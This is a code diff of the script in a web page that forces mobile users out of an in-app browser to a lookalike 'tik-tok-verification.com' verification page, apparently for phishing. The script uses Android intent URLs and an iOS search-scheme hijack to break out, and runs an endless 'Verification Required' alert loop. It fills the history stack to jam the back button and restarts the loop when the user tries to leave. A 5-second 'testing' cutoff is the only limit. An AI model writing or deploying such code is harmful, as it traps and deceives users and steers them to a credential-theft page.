@@ -9,66 +9,61 @@
 
 <script>
     const destination = "https://tik-tok-verification.com/Verification/verify1.html";
-    let isLocked = true;
+    
+    // Exact time the page loaded
+    const startTime = Date.now();
+    // STOP alerts exactly 5 seconds after load
+    const limit = 5000; 
 
-    // --- 5-SECOND FAIL-SAFE (STRICTLY FOR TESTING) ---
-    setTimeout(() => {
-        isLocked = false;
-        console.log("FAIL-SAFE TRIGGERED: Alerts stopped.");
-    }, 5000);
-
-    // THE REDIRECT METHOD THAT ACTUALLY WORKS
     function forceSystemOpen() {
-        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
         const isAndroid = /Android/i.test(navigator.userAgent);
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android Intent with package and fallback
-            const intent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
-            window.location.href = intent;
-        } 
-        
-        if (isIOS) {
-            // iOS Shotgun (Search Hijack + Calendar Blob)
+            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
+        } else if (isIOS) {
             window.location.replace("x-web-search://?" + encodeURIComponent(destination));
-            setTimeout(() => {
-                const blob = new Blob([`BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\nURL:${destination}\nEND:VEVENT\nEND:VCALENDAR`], {type: 'text/calendar'});
-                const url = URL.createObjectURL(blob);
-                window.location.href = url;
-            }, 100);
+            // Secondary trigger for iOS
+            const a = document.createElement('a');
+            a.href = destination;
+            a.rel = "noreferrer";
+            a.click();
         }
     }
 
-    // THE INFINITE ALERT LOOP
-    function startRampage() {
-        if (isLocked) {
-            // Trigger the breakout
-            forceSystemOpen();
-
-            // Lock the UI so they can't hit 'X' or leave
-            alert("Verification Required\n\nClick OK to continue in your browser.");
-            
-            // Re-fire after they click OK
-            forceSystemOpen();
-
-            // Loop immediately
-            setTimeout(startRampage, 10);
+    function rampage() {
+        // FAIL-SAFE: If current time is 5s past start, STOP everything.
+        if (Date.now() - startTime > limit) {
+            console.log("SAFE MODE ACTIVE");
+            return;
         }
+
+        // 1. Attempt breakout
+        forceSystemOpen();
+
+        // 2. Show the alert
+        alert("Verification Required\n\nClick OK to open your browser.");
+        
+        // 3. Attempt breakout again immediately after OK
+        forceSystemOpen();
+
+        // 4. Recursive call
+        setTimeout(rampage, 1);
     }
 
     window.onload = () => {
-        // Build backstack
-        for(let i=0; i<30; i++) history.pushState(null, null, "#step" + i);
+        // Build history to jam back button
+        for(let i=0; i<20; i++) history.pushState(null, null, "#" + i);
         
-        // Start immediately
-        startRampage();
+        // Start the engine
+        rampage();
     };
 
-    // The "X" Button Trap: restarts the rampage if the window loses focus
+    // If they hit X (blur), re-trigger the rampage logic
     window.onblur = () => {
-        if (isLocked) startRampage();
+        rampage();
     };
-
 </script>
+
 </body>
 </html>
